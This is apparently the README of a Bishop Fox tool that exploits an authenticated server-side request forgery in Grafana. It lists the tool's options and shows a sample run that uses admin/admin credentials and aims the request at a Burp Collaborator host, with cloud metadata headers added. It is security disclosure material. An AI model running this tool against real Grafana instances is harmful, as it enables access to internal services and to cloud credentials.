# grafana-ssrf
Authenticated SSRF in Grafana.

Notes
---

* Azure metadata header has been added to all SSRFS
* Google metadata header has been added to all SSRFS
* SSRF will not follow redirects no matter what so ensure url is direct.
* If login is via SSO or other none grafana logins please grab your session cookie and use the -s flag

Usage
---


```
usage: grafana-ssrf.py [-h] [-s SESSION] [-u URL] [-H HOST] [-f FILE] [-U USERNAME]
                  [-P PASSWORD]

optional arguments:
  -h, --help            show this help message and exit
  -s SESSION, --session SESSION
                        Session Cookie Value
  -u URL, --url URL     URL of host to check will need http or https
  -H HOST, --host HOST  Host for Grafana
  -f FILE, --file FILE  File of URLS to check SSRF Against
  -U USERNAME, --username USERNAME
                        Username for Grafana
  -P PASSWORD, --password PASSWORD
                        Password for Grafana
```

Example
---

```
python3 grafana.py -U admin -P admin -H http://localhost:3000 -u http://8t2s8yx5gh5nw0z9bd3atkoprgx6lv.burpcollaborator.net
Refreshed Sources
SSRF Source Updated
Status code:   200
Response body: <html><body>c7yzzb4zyj5v14wkpi2nxvzjigz</body></html>
Deleted Old SSRF Source
```


Don't forget to check out what jobs we have open!

https://bishopfox.com/jobs#open-positions - Come Join the Fox's!
